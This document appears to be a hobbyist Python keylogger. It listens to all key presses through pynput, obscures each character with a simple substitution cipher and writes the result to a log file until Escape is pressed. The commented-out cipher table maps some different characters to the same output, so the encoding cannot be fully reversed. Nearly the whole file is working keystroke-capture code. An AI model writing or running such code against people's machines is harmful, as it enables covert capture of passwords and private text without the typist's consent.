#print('This is the main file')

#Start from scratch

from pynput import keyboard
from pynput.keyboard import Listener
from Encription_File import *

Stroke = None

#storage = open('KeyBoard_Save.txt', 'a')

'''def encription(x):
    global Stroke
    if x == 'A':
        storage.write('e')
    elif x == 'B':
        storage.write('5')
    elif x == 'C':
        storage.write('r')
    elif x == 'D':
        storage.write('l')
    elif x == 'E':
        storage.write('g')
    elif x == 'F':
        storage.write('q')
    elif x == 'G':
        storage.write('v')
    elif x == 'H':
        storage.write('M')
    elif x == 'I':
        storage.write('Y')
    elif x == 'J':
        storage.write('B')
    elif x == 'K':
        storage.write('K')
    elif x == 'L':
        storage.write('I')
    elif x == 'M':
        storage.write('5')
    elif x == 'N':
        storage.write('C')
    elif x == 'O':
        storage.write('o')
    elif x == 'P':
        storage.write('1')
    elif x == 'Q':
        storage.write('t')
    elif x == 'R':
        storage.write('n')
    elif x == 'S':
        storage.write('i')
    elif x == 'T':
        storage.write('T')
    elif x == 'U':
        storage.write('f')
    elif x == 'V':
        storage.write('j')
    elif x == 'W':
        storage.write('W')
    elif x == 'X':
        storage.write('7')
    elif x == 'Y':
        storage.write('c')
    elif x == 'Z':
        storage.write('6')
    elif x == 'a':
        storage.write('p')
    elif x == 'b':
        storage.write('D')
    elif x == 'c':
        storage.write('F')
    elif x == 'd':
        storage.write('9')
    elif x == 'e':
        storage.write('y')
    elif x == 'f':
        storage.write('V')
    elif x == 'g':
        storage.write('S')
    elif x == 'h':
        storage.write('O')
    elif x == 'i':
        storage.write('b')
    elif x == 'j':
        storage.write('E')
    elif x == 'k':
        storage.write('d')
    elif x == 'l':
        storage.write('a')
    elif x == 'm':
        storage.write('A')
    elif x == 'n':
        storage.write('h')
    elif x == 'o':
        storage.write('z')
    elif x == 'p':
        storage.write('w')
    elif x == 'q':
        storage.write('R')
    elif x == 'r':
        storage.write('x')
    elif x == 's':
        storage.write('s')
    elif x == 't':
        storage.write('P')
    elif x == 'u':
        storage.write('H')
    elif x == 'v':
        storage.write('L')
    elif x == 'w':
        storage.write('3')
    elif x == 'x':
        storage.write('u')
    elif x == 'y':
        storage.write('X')
    elif x == 'z':
        storage.write('4')
    elif x == '1':
        storage.write('U')
    elif x == '2':
        storage.write('Q')
    elif x == '3':
        storage.write('G')
    elif x == '4':
        storage.write('0')
    elif x == '5':
        storage.write('m')
    elif x == '6':
        storage.write('J')
    elif x == '7':
        storage.write('N')
    elif x == '8':
        storage.write('k')
    elif x == '9':
        storage.write('2')
    elif x == '0':
        storage.write('z')
    else:
        pass
'''

def record_click(key):
    global Stroke  # Declare that we are using the global variable
    try:
        Stroke = key.char
        encription(Stroke)
    except AttributeError:
        storage.write(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

with keyboard.Listener(on_press=record_click, on_release=on_release) as listener:
    listener.join()

storage.close()